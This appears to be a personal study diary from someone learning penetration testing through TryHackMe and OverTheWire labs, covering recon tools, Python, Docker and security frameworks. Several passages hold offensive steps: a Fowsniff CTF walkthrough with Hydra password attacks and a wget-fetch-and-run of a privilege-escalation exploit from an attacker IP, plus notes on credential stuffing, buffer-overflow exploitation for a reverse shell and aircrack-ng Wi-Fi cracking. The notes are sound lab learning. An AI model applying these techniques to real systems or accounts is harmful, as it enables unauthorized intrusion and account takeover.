Day 15:

in top 3% on thm
started advent of cyber and jr pentester path on thm..tryna cover all free rooms in this
learnt what is pentesting, basic security principles
vulnerabilities and their types...cvss, vpr, exploitdb, nvd

intro to web hacking..just using browser..no linux
inspect, vw src code, developer tools like inspector, debugger, network
content discovery:
mannual:sitemap.xml, robots.txt, framework stack, http headers, favicon
osint:google dorking, wappalyzer, github, waybackmachine, s3 buckets
automated:dirb, ffuf, gobuster..using wordlists

passive recon: whois: to get info abt website, dig, nslookup for dns servers , dnsdumpster and shodan.io for dns stuff in detail

Day 16:
got selected for CyberSecurity and Digital Forensics Internship program in Cyber Secured India
did week1 ka stuff..windows,linux and networking fundamentals..

Day 17: 
learnt to execute elf files ./filename
ltrace ./filename to see library calls
strace ./filename to see system calls
using && to mainpulate data in elf files..
solved leviathan challenge in overthewire

plan: finish all overthewire challhenges and concepts by this week end..in another 3-4 days

Day 18:
finished activerecon thm room
ping -c 10 MACHINE_IP to check if target is alive n sending back pkts
traceroute MACHINE_IP to find path thr whivh data flows thr all routers to reach destination
telnet MACHINE_IP PORT_NUMBER insecure ssh basically it is andre no encryption
nc MACHINE_IP PORT_NUMBER on client
nc -lvnp PORT_NUMBER on server
Ctrl+Shift+I for seeing developer tools on firefox open script.js

There are also plenty of add-ons for Firefox and Chrome that can help in penetration testing. Here are a few examples:

FoxyProxy lets you quickly change the proxy server you are using to access the target website. This browser extension is convenient when yo
u are using a tool such as Burp Suite or if you need to switch proxy servers regularly. You can get FoxyProxy for Firefox from here.
User-Agent Switcher and Manager gives you the ability to pretend to be accessing the webpage from a different operating system or different
web browser. In other words, you can pretend to be browsing a site using an iPhone when in fact, you are accessing it from Mozilla Firefox.
Wappalyzer provides insights about the technologies used on the visited websites. Such extension is handy, primarily when you collect all
this information while browsing the website like any other user.

Python:
name = input("enter ur name:")
print("hello"+name)
reading n writing files: months = open('months.txt') ,print(months), months.close()
months.mode, months.readable(), months.readLines(),months.seek(0)
to write: open('days.txt',"w"), days.write("Monday")
classes n objects
def_init(self,...), self.price, if not(isinstance(...))

, used the decoded one to open file to get flag
Did the following rooms on thm:
TheImpossibleChallenge: downloaded zip file to crack password..took that string, did rot13,rot47,hex, base 64, went to developers tools, found a text
used it in Unicode zero-width characters steg, used the decoded one to open file to get flag
Fowsniff CTF: Identifying target host by using the Netdiscover utility
              Identifying open port by using the Nmap scan
              Enumerating HTTP service by using the Dirb utility
              Extracting information from the Internet about the target
              Cracking password hashes -crackstation
              Launching dictionary attack with Hydra-using username and passwd list
              Accessing POP3 service with NetCut- nc ip 110, pop3 is to check mails
              Retrieving emails - retr 1,2 
              Launching dictionary attack with Hydra for SSH-passwd reset was in one of the mails
              Taking access of target machine-login using ssh, uname -a to find out kernel, download an exploit using wget frm exloitdb
              Searching for local exploit
              Downloading exploit on the attacker machine and compiling
              Transferring exploit on target machine and exploiting
              Reading flag file
              
              
<<cd /tmp/ >>
<<wget 192.168.1.107/exploit >>
<<chmod +x exploit >>
<<./exploit >>
in tmp do id, cat /root/flag to get flag


Day 20:[30-11-2022]
Nessus: vulnerability scanner 
go to their website n download unfortunately no disk space
its like an automated tool and u mark all checkboxes it tries to scan and show version of all top vulnerabilities on its own n then u can click on each n see

credential stuffing:injecting breached ccount credentials in hopes of account takeover
use foxy proxy,burpsuit,in tht pitchfort, set list of emails n passwds n use payload to attack n see
do it one or two at a time coz ella ottige madidre dos attack agi lock agbodu

Exploit devpt:
install vulnserver on windows and immunity debugger
buffer overflow: normal buffer space exceed adaga, content goes to extended instruction pointer return address which can be used to pt to malicious code tht 
gives us a reverse shell
steps in buffer overflow: spiking:find vuln part of pgm
                           fuzzing:trying to inject something to brk in
                           finding offset i.e at which part u were able to brk in
                           using offset to overwrite eip
                           cleanup:finding right char, module
                           generate malicious shell code to get rev shell n pt eip to get root
  
Solved a TryHackMe room | Intro to containerisation: learnt about containerisation, why its done, containers, docker
containerisation is the process of packaging an application and the necessary resources (such as libraries and packages) required into one package named a container.
The process of packaging applications together makes applications considerably portable and hassle-free to run.packaging the dependencies together and “isolating”
saves disk space no need to install vms
containerisation platforms make use of the “namespace”
Docker employs the same technology used in containerisation to isolate applications into containers called the Docker Engine. The Docker Engine is essentially
an API that runs on the host operating system,which communicates between the operating system and containers to access the system’s hardware..uses YAML syntax
 Processes can only "see" other processes that are in the same namespace - no conflicts in theory. Take Docker, for example, every new container will 
 be running as a new namespace, although the container may be running multiple applications (and in turn, processes).
                           

WifiHacking101: use aircrack-ng -a2 -b 02:1A:11:FF:D9:BD -w /usr/share/wordlists/rockyou.txt NinjaJc01–01.cap to extract from file n find password 
use man pg to find any othr related details for this command
this is when the capture is given


Day 21:[02-12-2022]
Started advent of cyber 2022
Learnt about security frameworks:
1.NSIT[National Institute of Standards and Technology]:Identify,Protect,Detect,Respond,Recover
2.ISO 27000 Series:These standards can be used to assess an institution’s ability to meet set information security requirements
through the application of risk management
3.MITRE ATT&CK Framework:Tactics, Techniques and Procedures (TTPs)
4.Cyber Kill Chain:Recon,Weaponization,Delivery,Exploitation,Installation,Command and control,Actions on objectives
5.Unified Kill Chain:3 cycles:In,Through,Out

About log files:
Log files are files that contain historical records of events and other data from an application
help to know about Login attempts or failures,Traffic on a network,Things (website URLs, files, etc.) that have been accessed,Password changes,Application errors
Log file contains A timestamp of the event (I.e. Date & Time)
The name of the service that is generating the logfile (I.e. SSH is a remote device management protocol that allows a user to login into a system remotely)
The actual event the service logs (i.e., in the event of a failed authentication, what credentials were tried, and by whom? (IP address)).
Located in /var/log
Tools such as Splunk are software solutions known as Security Information and Event Management (SIEM) is dedicated to aggregating logs for analysis.
use grep to find something in log files: -i case insensitive, -E reg exp, -r search recursively
